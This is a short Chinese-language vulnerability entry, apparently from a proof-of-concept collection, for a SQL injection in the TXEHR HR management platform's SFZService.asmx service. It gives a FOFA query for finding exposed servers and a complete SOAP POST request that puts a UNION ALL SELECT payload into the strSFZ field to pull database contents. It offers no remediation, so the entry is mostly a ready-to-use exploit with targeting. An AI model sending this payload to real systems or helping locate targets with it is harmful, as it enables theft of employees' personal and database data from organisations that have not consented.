# 同享人力管理管理平台SFZService.asmx存在SQL注入漏洞

同享TXEHR人力管理管理平台SFZService.asmx存在SQL注入漏洞，攻击者可获取数据库敏感信息。

## fofa

```yaml
body="/Assistant/Default.aspx"
```

## poc

```java
POST /Service/SFZService.asmx
HOST: 
SOAPAction: http://tempuri.org/GetEmployeeBySFZ
Content-Type: text/xml;charset=UTF-8

<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\
      \ xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n\
      \      <tem:GetEmployeeBySFZ>\n         <!--type: string-->\n         <tem:strSFZ>1'\
      \ UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHAR(113)+CHAR(107)+CHAR(122)+CHAR(122)+CHAR(113)+CHAR(81)+CHAR(78)+CHAR(79)+CHAR(122)+CHAR(106)+CHAR(69)+CHAR(103)+CHAR(80)+CHAR(87)+CHAR(89)+CHAR(117)+CHAR(97)+CHAR(104)+CHAR(105)+CHAR(74)+CHAR(109)+CHAR(80)+CHAR(68)+CHAR(74)+CHAR(98)+CHAR(122)+CHAR(99)+CHAR(103)+CHAR(90)+CHAR(68)+CHAR(105)+CHAR(114)+CHAR(107)+CHAR(69)+CHAR(86)+CHAR(121)+CHAR(76)+CHAR(69)+CHAR(115)+CHAR(102)+CHAR(81)+CHAR(76)+CHAR(105)+CHAR(101)+CHAR(74)+CHAR(113)+CHAR(112)+CHAR(113)+CHAR(98)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--\
      \ hExp</tem:strSFZ>\n      </tem:GetEmployeeBySFZ>\n   </soapenv:Body>\n</soapenv:Envelope>
```

